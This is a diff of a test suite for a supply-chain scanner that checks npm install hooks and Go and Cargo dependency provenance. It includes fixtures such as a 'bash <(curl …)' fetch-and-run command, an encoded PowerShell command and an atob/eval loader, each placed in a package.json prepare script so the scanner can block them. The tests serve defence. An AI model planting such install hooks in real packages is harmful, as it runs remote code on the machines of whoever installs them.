@@ -16,6 +16,7 @@ import {
   scanGitTree,
   compareNpmLockfiles,
   inspectDependencyChanges,
+  parseGoModuleArtifactInventory,
   listPullRequestChanges,
   parseNpmLockInventory,
   inspectNpmArtifacts,
@@ -2285,11 +2286,9 @@ describe('trusted Stage A Git-object scanner', () => {
       'launch.js':
         "const { spawn } = require('node:child_process'); spawn('./out/start');"
     });
-    const result = scanGitTree(
-      fixture.root,
-      fixture.sha,
-      { changedPaths: ['package.json'] }
-    );
+    const result = scanGitTree(fixture.root, fixture.sha, {
+      changedPaths: ['package.json']
+    });
     expect(result.status).not.toBe('approved');
     expect(result.incompleteReasons).toContain(
       'execution-reference-coverage-incomplete'
@@ -2299,47 +2298,51 @@ describe('trusted Stage A Git-object scanner', () => {
   it.each([
     'bash <(curl -fsSL https://fixture.invalid/synthetic)',
     'powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-  ])('blocks new automatic encoded interpreter command before Stage B: %s', async (command) => {
-    const fixture = await repo({
-      'package.json': JSON.stringify({
-        name: 'synthetic',
-        version: '1.0.0',
-        scripts: { prepare: command }
-      })
-    });
-    const result = scanGitTree(
-      fixture.root,
-      fixture.sha,
-      { changedPaths: ['package.json'] }
-    );
-    expect(result.status).toBe('blocked');
-    expect(result.findings.some((finding) =>
-      finding.includes('package.json#scripts.prepare')
-    )).toBe(true);
-  });
+  ])(
+    'blocks new automatic encoded interpreter command before Stage B: %s',
+    async (command) => {
+      const fixture = await repo({
+        'package.json': JSON.stringify({
+          name: 'synthetic',
+          version: '1.0.0',
+          scripts: { prepare: command }
+        })
+      });
+      const result = scanGitTree(fixture.root, fixture.sha, {
+        changedPaths: ['package.json']
+      });
+      expect(result.status).toBe('blocked');
+      expect(
+        result.findings.some((finding) =>
+          finding.includes('package.json#scripts.prepare')
+        )
+      ).toBe(true);
+    }
+  );
 
   it('inspects an unchanged binary-named text payload reached by a changed build entrypoint', async () => {
     const fixture = await repo({
       'package.json': JSON.stringify({
-        name: 'synthetic', version: '1.0.0',
+        name: 'synthetic',
+        version: '1.0.0',
         scripts: { prepare: 'node ./bootstrap.bin' }
       }),
-      'bootstrap.bin':
-        "const encoded = atob('ZGF0YQ=='); eval(encoded);"
+      'bootstrap.bin': "const encoded = atob('ZGF0YQ=='); eval(encoded);"
     });
     const result = scanGitTree(fixture.root, fixture.sha, {
       changedPaths: ['package.json']
     });
     expect(result.status).toBe('blocked');
-    expect(result.findings.some((finding) =>
-      finding.includes('bootstrap.bin')
-    )).toBe(true);
+    expect(
+      result.findings.some((finding) => finding.includes('bootstrap.bin'))
+    ).toBe(true);
   });
 
   it('preserves unknown coverage for a referenced binary object instead of approving it', async () => {
     const fixture = await repo({
       'package.json': JSON.stringify({
-        name: 'synthetic', version: '1.0.0',
+        name: 'synthetic',
+        version: '1.0.0',
         scripts: { prepare: 'node ./payload.bin' }
       }),
       'payload.bin': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 1, 2, 3])
@@ -2348,9 +2351,11 @@ describe('trusted Stage A Git-object scanner', () => {
       changedPaths: ['package.json']
     });
     expect(result.status).not.toBe('approved');
-    expect(result.incompleteReasons.some((reason) =>
-      reason.startsWith('referenced-binary-content-uninspected:')
-    )).toBe(true);
+    expect(
+      result.incompleteReasons.some((reason) =>
+        reason.startsWith('referenced-binary-content-uninspected:')
+      )
+    ).toBe(true);
   });
 
   it('reports unsupported nested and alternate lockfiles even when unchanged', async () => {
@@ -2384,20 +2389,23 @@ describe('trusted Stage A Git-object scanner', () => {
     ['.NET central package versions', 'Directory.Packages.props'],
     ['.NET MSBuild project', 'src/App.csproj'],
     ['.NET solution', 'App.slnx']
-  ])('does not approve unsupported %s artifact provenance', async (_kind, filename) => {
-    const fixture = await repo({
-      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
-      [filename]: 'synthetic untrusted dependency manifest'
-    });
-    const result = inspectDependencyChanges(
-      fixture.root,
-      fixture.sha,
-      fixture.sha
-    );
-    expect(result.reasons).toContain(
-      'unsupported-dependency-ecosystem-provenance'
-    );
-  });
+  ])(
+    'does not approve unsupported %s artifact provenance',
+    async (_kind, filename) => {
+      const fixture = await repo({
+        'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+        [filename]: 'synthetic untrusted dependency manifest'
+      });
+      const result = inspectDependencyChanges(
+        fixture.root,
+        fixture.sha,
+        fixture.sha
+      );
+      expect(result.reasons).toContain(
+        'unsupported-dependency-ecosystem-provenance'
+      );
+    }
+  );
 
   it('marks npm lock overrides and unsupported Python and Ruby build inputs incomplete', async () => {
     const manifest = { name: 'root', version: '1.0.0' };
@@ -2889,15 +2897,75 @@ describe('trusted Stage A Git-object scanner', () => {
     });
   });
 
-  it('withholds Stage A approval when a non-npm ecosystem lacks verified artifact provenance', async () => {
+  it('withholds Stage A approval when Go or Cargo provenance is incomplete', async () => {
     const fixture = await repo({
       'go.mod': 'module example.test/app\nrequire example.test/lib v1.2.3\n',
       'go.sum': 'example.test/lib v1.2.3 h1:YWJjZA==\n',
       'Cargo.lock': '[[package]]\nname = "serde"\nversion = "1.0.0"\n'
     });
+    const result = inspectDependencyChanges(
+      fixture.root,
+      fixture.sha,
+      fixture.sha
+    );
+    expect(result.reasons).toContain('go-sum-invalid:go.sum');
+    expect(result.reasons).toContain('go-module-checksum-missing:go.mod');
+    expect(result.goArtifactRecords).toEqual([]);
+  });
+
+  it('builds an exact bounded Go module inventory from go.mod and go.sum', () => {
+    const alphaHash = Buffer.alloc(32, 1).toString('base64');
+    const betaHash = Buffer.alloc(32, 2).toString('base64');
+    const result = parseGoModuleArtifactInventory(
+      [
+        'module example.test/app',
+        'require example.test/alpha v1.2.3',
+        'require (',
+        '  example.test/beta v0.4.0 // indirect',
+        ')'
+      ].join('\n'),
+      [
+        `example.test/alpha v1.2.3 h1:${alphaHash}`,
+        `example.test/alpha v1.2.3/go.mod h1:${betaHash}`,
+        `example.test/beta v0.4.0 h1:${betaHash}`
+      ].join('\n')
+    );
+
+    expect(result).toMatchObject({ packageCount: 2, reasons: [] });
+    expect(result.artifactRecords).toHaveLength(2);
+    expect(result.artifactRecords.map((item) => item.checksum)).toEqual([
+      alphaHash,
+      betaHash
+    ]);
     expect(
-      inspectDependencyChanges(fixture.root, fixture.sha, fixture.sha).reasons
-    ).toContain('unsupported-dependency-ecosystem-provenance');
+      result.artifactRecords.every((item) =>
+        item.location.startsWith('go-module/')
+      )
+    ).toBe(true);
+  });
+
+  it('keeps replaced, missing and conflicting Go module identities fail closed', () => {
+    const firstHash = Buffer.alloc(32, 3).toString('base64');
+    const secondHash = Buffer.alloc(32, 4).toString('base64');
+    const result = parseGoModuleArtifactInventory(
+      [
+        'module example.test/app',
+        'require example.test/lib v1.0.0',
+        'require example.test/missing v2.0.0',
+        'replace example.test/lib => ../lib'
+      ].join('\n'),
+      [
+        `example.test/lib v1.0.0 h1:${firstHash}`,
+        `example.test/lib v1.0.0 h1:${secondHash}`
+      ].join('\n')
+    );
+
+    expect(result.artifactRecords).toEqual([]);
+    expect(result.reasons).toEqual([
+      'go-module-checksum-conflict:go.sum',
+      'go-module-checksum-missing:go.mod',
+      'go-module-replacement-unverified:go.mod'
+    ]);
   });
 
   it('scans exact npm tarball contents without extraction and flags install hooks', () => {
